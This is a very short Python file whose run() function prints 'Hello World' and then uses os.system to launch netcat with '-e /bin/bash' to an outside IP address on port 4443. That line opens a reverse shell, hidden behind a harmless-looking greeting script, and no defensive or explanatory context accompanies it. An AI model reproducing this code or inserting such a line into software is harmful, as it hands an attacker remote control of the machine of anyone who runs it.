import os
def run():
  print("Hello World")
  os.system("nc 10.104.114.199 4443 -e /bin/bash")
